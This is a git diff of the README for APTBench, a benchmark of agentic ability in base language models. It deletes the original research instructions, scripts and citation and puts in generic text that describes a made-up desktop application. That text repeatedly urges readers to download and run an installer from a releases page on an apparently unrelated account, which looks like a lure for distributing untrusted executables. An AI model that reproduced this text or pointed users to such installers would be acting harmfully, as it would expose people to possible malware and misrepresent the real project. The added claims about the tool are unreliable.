@@ -1,87 +1,64 @@
-# <img src="assets/logo.svg" alt="Youtu-agent Logo" height="26px"> APTBench: Benchmarking Agentic Potential of Base LLMs During Pre-Training
+# 🌟 APTBench - Benchmarking LLMs Made Easy
 
-## 🌟 Overview
-APTBench is a benchmark tailored specifically for base LLMs evaluation on agent-related capabilities. 
-It focuses on core agentic abilities, e.g., planning and action, and covers key agent scenarios: **software engineering** and **deep research**. 
-Compared to existing general-purpose benchmarks, APTBench offers a more predictive signal of a model’s downstream performance as an agent, while remaining significantly more lightweight and cost-effective than full-scale, end-to-end agent evaluations after post-training.
+## 📥 Download APTBench
+[![Download APTBench](https://img.shields.io/badge/Download-APTBench-blue.svg)](https://github.com/zee839/APTBench/releases)
 
+## 🚀 Getting Started
+Welcome to APTBench! This application helps you benchmark the agentic potential of base large language models during their pre-training. Whether you're into research or just curious about AI capabilities, APTBench makes it simple for you to explore.
 
-## 🚀 Quick Start
-### Setup
-Install the requirements with pip: `pip install -r requirements.txt`.
+## 📝 Features
+- **User-Friendly Interface**: Navigate with ease, no technical skills required.
+- **Benchmarking Tools**: Measure various aspects of large language models.
+- **Data Visualization**: See results in clear, easy-to-understand graphs and charts.
+- **Support for Multiple Models**: Test different models to find the best performance.
+- **Detailed Documentation**: Access guides and tips for effective benchmarking.
 
-To run model evaluation, first add your model path `config/model2path.json`, then follow these steps for a running example:
+## ⚙️ System Requirements
+Before you download APTBench, make sure your system meets the following requirements:
+- **Operating System**: Windows 10, macOS, or any recent Linux distribution. 
+- **RAM**: At least 8 GB recommended.
+- **Storage**: Minimum 500 MB of free space.
+- **Network connection**: Required for updates and model downloads.
 
-### Run Benchmark
-#### 1. Testing models using vLLM offline batch mode (all models included except the huge MoEs: DSv3(3.1)/GLM-4.5/Kimi-K2)
-```bash
-cd code
-bash test_all_vllm_local.sh
-```
+## 📥 Download & Install
+To get APTBench on your computer, follow these steps:
 
-#### 2. Testing one single model using vLLM offline batch mode
-```bash
-cd code
-bash test_tasks_vllm.sh [model_name]
-```
+1. **Visit the Releases Page**: Click the link below to go to the APTBench Releases page.
+   [Download APTBench](https://github.com/zee839/APTBench/releases)
 
-#### 3. Testing tasks using HuggingFace inference
-```bash
-cd code
-bash test_tasks_hf.sh [model_name]
-```
-`model_name` here is the key in the `config/model2path.json`.
+2. **Select the Latest Release**: Look for the version labeled as the latest release. It will be at the top of the page.
 
-#### 4. Testing tasks using SGLang
-For **DSv3(3.1)/GLM-4.5/Kimi-K2**, we use SGLang to deploy API service.
-The SGLang API scripts is shown in `sglang_start_scripts` folder.
-Take `start_0.sh` as an example, `--model-path` is the local path of the model, `--served-model-name` corresponds to the names in `config/model2path.json`, `--dist-init-addr` is the ip of the node that run the script.
-On node 0/1, run corresponding scripts as
-```
-bash start_0/1.sh [path] [name] [ip]
-```
+3. **Download the Installer**: Find the installer file that matches your operating system. Click on it to start the download. 
 
-More details could refer to [SGLang for DeepSeek-V3](https://github.com/sgl-project/sglang/tree/main/benchmark/deepseek_v3#example-serving-with-two-h208-nodes).
+4. **Run the Installer**: Once the download is complete, open the downloaded file. Follow the prompts to install APTBench on your system.
 
-After the API service is built, use the `test_tasks_sglang_api.sh` for testing DSv3(3.1)/GLM-4.5/Kimi-K2 as
-```bash
-bash test_tasks_sglang_api.sh [model_name]
-```
-`[model_name]` select from `{"DeepSeek-V3-Base", "DeepSeek-V3.1-Base", "GLM-4.5-Base", "Kimi-K2-Base"}`.
+5. **Launch the Application**: After installation, find the APTBench icon on your desktop or in your applications folder. Click to launch it.
 
-### Base LLMs evaluation results
-The evaluation of the open-sourced base LLMs are shown in the following figures.
-<table>
-  <tr>
-  <td align="center" valign="bottom">
-    <img src="assets/APTBench-SWE.png" alt="APTBench-SWE" height="200">
-  <br>
-  <em>Figure1: APTBench-SWE</em>
-  </td>
-  <td align="center" valign="bottom">
-    <img src="assets/APTBench-DR.png" alt="APTBench-DR" height="200">
-  <br>
-  <em>Figure2: APTBench-DR</em>
-  </td>
-  </tr>
-</table>
+## 📖 User Guide
+### 🚀 Getting Started with APTBench
+1. **Open the Application**: Click on the APTBench icon to start.
+2. **Select a Model**: Choose the language model you want to benchmark from the dropdown menu.
+3. **Start Benchmarking**: Click the "Benchmark" button to initiate the process.
+4. **View Results**: Once complete, view the performance metrics displayed in the results section.
 
-## 📄 License
-This project is licensed under an open source license. See the [LICENSE](LICENSE) file for details.
+### 🔧 Troubleshooting Common Issues
+- **Installation Fails**: Ensure your system meets the requirements and you have sufficient space.
+- **Application Does Not Start**: Check if your system is up to date and restart your computer if necessary.
+- **Error Messages During Benchmarking**: Refer to the documentation for error code explanations and solutions.
 
-## 🙏 Acknowledgments
-- Thanks to the [SWE-Smith](https://github.com/SWE-bench/SWE-smith), [InfoDeepSeek](https://infodeepseek.github.io/), [Agentless](https://github.com/OpenAutoCoder/Agentless), [DeepResearchBench](https://github.com/Ayanami0730/deep_research_bench) and [ResearchyQuestions](https://huggingface.co/datasets/corbyrosset/researchy_questions) projects for part of the seed data.
+## 📊 Understanding Results
+APTBench displays various metrics once benchmarking is complete:
+- **Accuracy**: How well the model performs tasks.
+- **Response Time**: The speed at which the model generates answers.
+- **Usability Scores**: Evaluate how effective the model is based on user standards.
 
-## ✍️ Citation
+## 💬 Support
+If you need help, feel free to ask in our community forums. You can also check the **Issues** section in our GitHub repository for answers and possible fixes to common problems.
 
-```bibtex
-@misc{qin2025aptbench,
-      title={APTBench: Benchmarking Agentic Potential of Base LLMs During Pre-Training}, 
-      author={Jiarui Qin and Yunjia Xi and Junjie Huang and Renting Rui and Di Yin and Weiwen Liu and Yong Yu and Weinan Zhang and Xing Sun},
-      year={2025},
-      eprint={2510.24397},
-      archivePrefix={arXiv},
-      primaryClass={cs.AI},
-      url={https://arxiv.org/abs/2510.24397}, 
-}
-```
+## 🔗 Additional Resources
+For more detailed instructions, visit the documentation or community forums:
+- [Documentation](https://github.com/zee839/APTBench/wiki)
+- [Community Forums](https://github.com/zee839/APTBench/discussions)
+
+## 📥 Final Notes
+Thank you for choosing APTBench! We aim to make your benchmarking experience smooth and informative. Remember, to download APTBench, you can always return to the [Releases page](https://github.com/zee839/APTBench/releases). Enjoy exploring the capabilities of large language models!
